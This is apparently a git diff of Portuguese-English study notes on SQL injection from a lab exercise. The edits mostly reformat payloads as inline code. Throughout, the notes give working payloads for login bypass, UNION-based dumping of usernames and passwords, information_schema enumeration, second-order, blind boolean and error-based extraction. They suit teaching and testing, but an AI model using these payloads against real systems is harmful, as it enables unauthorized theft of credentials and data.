@@ -5,9 +5,10 @@
 ### SELECT * FROM users where username='".$user."' AND password = '.md5($password)."'
 
 As we can see, the password is hashed using md5, so that's probably not the best path for us to attack from. However, the User Field is not protected at all
-Se no login, na parte do username, escrevermos **voldemort' -- //**, Isto causa que o resto da query seja ignorada
+Se no login, na parte do username, escrevermos ```voldemort' -- //```, Isto causa que o resto da query seja ignorada
 > -- // é como se faz comentarios em SQL
- Assim o server recebe:
+
+Assim o server recebe:
 
 ```sql
 SELECT * FROM users where username='voldemort' -- //' AND password =''
@@ -25,7 +26,7 @@ SELECT * FROM users where (username='voldemort' -- //') AND (password = '.md5($p
 
 Acaba-se com uma query mal formada, uma vez que nunca foram fechados os parenteses.
 
-Entao, se fizermos login com o username **voldemort') -- //**, cria a seguinte query:
+Entao, se fizermos login com o username ```voldemort') -- //```, cria a seguinte query:
 
 ```sql
  "SELECT * FROM users where username=('Voldemort') -- // ') AND password = '.md5($password). 
@@ -40,7 +41,7 @@ Assim já funciona a injection.
 Neste exercício, estamos a usar uma barra de pesquisa em que nos aparecem os items que começam com a substring *".$query."*
 Como não há qualquer tipo de validação, podemos fazer traquinagem
 
-Por exemplo, se escrevermos na barra **b%' order by 5 -- //**, o servidor vai receber a query:
+Por exemplo, se escrevermos na barra ```b%' order by 5 -- //```, o servidor vai receber a query:
 
 ```sql
 SELECT * FROM products WHERE product_name LIKE 'b%' order by 5 -- //%'
@@ -50,7 +51,8 @@ Isto ordena a tabela resultante pela quinta coluna de dados.
 
 Dá pa fazer mais cenas na search bar.
 > The UNION operator is used to combine the result-set of two or more SELECT statements
-Por tanto se fizermos:
+
+Portanto se fizermos:
 
 ```sql
 'union select null,id,username,password,fname from users -- //  
@@ -64,17 +66,18 @@ Cria a query:
 
 Assim, alem de aparecerem os produtos, aparece tambem uma tabela com id, username, pass ...
 
-Se não soubermos os nomes das variáveis e tabelas, o que é muito provavel, fazemos **'union select null,null,null,null,table_name from information_schema.tables -- //**
+Se não soubermos os nomes das variáveis e tabelas, o que é muito provavel, fazemos ```'union select null,null,null,null,table_name from information_schema.tables -- //```
 
 Isto retorna tudo o que existe na base de dados.
 
 ## SQL Second Order Attacks
 
 This designation (Second Order Attacks) is given to attacks that result in the storage of an unsanitized piece of SQL, that is later executed by an insecure function
-Por exemplo, regista-se uma conta com username e pass, mas no username injeta-se SQL. Não acontece nada de momento, mas mais tarde quando se for trocar de pass, o SQL injetado vai ser executado. ***É por isso que se chama second order***
+Por exemplo, regista-se uma conta com username e pass, mas no username injeta-se SQL. Não acontece nada de momento, mas mais tarde quando se for trocar de pass, o SQL injetado vai ser executado. ***É por isso que se chama second order.***
 
-Utilizando **' or 1 in (select password from users) -- //**, dá nos um erro, mas a mensagem de erro mostra nos também o que queremos:
+Utilizando ```' or 1 in (select password from users) -- //```, dá nos um erro, mas a mensagem de erro mostra nos também o que queremos:
 > Warning<: 1292: Truncated incorrect DOUBLE value : (...)
+
 (Where ==(...)== are all the passwords in the **users** table password column)
 
 ## Blind SQL Injection
@@ -89,8 +92,8 @@ A query da pagina funciona da seguinte forma:
 SELECT * FROM users WHERE username = '".$_GET["user"]."'
 ```
 
-Utilizaremos a template **voldemort AND TEST** em que TEST é qualquer pedaço de código SQL.
-Podemos, por exemplo, fazer: **voldemort AND SUBSTRING((select count(id) from users), 1) = N' -- //**
+Utilizaremos a template ```voldemort AND TEST``` em que TEST é qualquer pedaço de código SQL.
+Podemos, por exemplo, fazer: ```voldemort AND SUBSTRING((select count(id) from users), 1) = N' -- //```
 
 Isto cria a seguinte query:
 
@@ -98,7 +101,7 @@ Isto cria a seguinte query:
 SELECT * FROM users WHERE username = '.$_GET["voldemort AND SUBSTRING((select count(id) from users), 1) = N"].'
 ```
 
-> By gradually incrementing N, we can, by **trial and error** get how many users exist in the **users** table (which corresponds to how many users exist overall). We'll know we've hit jackpot (i.e N equals the number of users that exist) when information is shown on the page (meaning that our < TEST > was validated as **TRUE** !) This basically gives us a way to find out anything we want from the database, using an exhaustive, and repetitive form, by basically continously asking the query: "Is < TEST > correct? Yes? Cool! No? Well, how about this?"
+> By gradually incrementing N, we can, by **trial and error** get how many users exist in the **users** table (which corresponds to how many users exist overall). We'll know we've hit jackpot (i.e N equals the number of users that exist) when information is shown on the page (meaning that our < TEST > was validated as **TRUE** !) This basically gives us a way to find out anything we want from the database, using an exhaustive, and repetitive form, by basically continously asking the query: "Is < TEST > correct? How about this"
 
 ## Error based data extraction
 
@@ -110,7 +113,7 @@ Lembrando que esta form funciona da seguinte forma:
 SELECT * FROM users where username='".$user."' AND password = '.md5($password).
 ```
 
-Se escrevermos isto no login: **' or 1 in (select @@version) -- //**, o server recebe:
+Se escrevermos isto no login: ```' or 1 in (select @@version) -- //```, o server recebe:
 
 ```sql
 SELECT * FROM users where username='' or 1 in (select @@version) -- //' AND password = '.md5($password)."'
@@ -118,6 +121,7 @@ SELECT * FROM users where username='' or 1 in (select @@version) -- //' AND pass
 
 Aparece na página o seguinte erro:
 > Warning: 1292: Truncated incorrect DOUBLE value: '8.0.17'
+
 Já sabemos a versao do server.
 
 ### Outras funcionalidades
